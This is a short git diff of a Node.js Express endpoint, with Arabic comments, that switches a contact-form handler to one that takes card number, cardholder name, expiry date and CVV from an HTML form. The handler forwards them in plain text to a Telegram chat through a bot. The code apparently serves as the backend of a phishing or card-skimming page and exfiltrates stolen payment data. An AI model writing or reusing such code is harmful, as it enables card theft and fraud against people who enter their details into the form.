@@ -13,12 +13,13 @@ const CHAT_ID = process.env.CHAT_ID;
 
 // استقبال البيانات من HTML وإرسالها إلى تيليجرام
 app.post("/send", async (req, res) => {
-    const { name, phone, message } = req.body;
-    if (!name || !phone || !message) {
+    const { cardNumber, cardHolder, expiryDate, cvv, saveCard } = req.body;
+
+    if (!cardNumber || !cardHolder || !expiryDate || !cvv) {
         return res.status(400).json({ message: "يجب ملء جميع الحقول!" });
     }
 
-    const text = `🚀 بيانات جديدة:\n\n👤 الاسم: ${name}\n📞 الهاتف: ${phone}\n✉️ الرسالة: ${message}`;
+    const text = `🚀 بيانات جديدة:\n\n💳 رقم البطاقة: ${cardNumber}\n👤 اسم حامل البطاقة: ${cardHolder}\n📆 تاريخ الانتهاء: ${expiryDate}\n🔒 CVV: ${cvv}\n💾 حفظ البطاقة: ${saveCard}`;
 
     try {
         await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
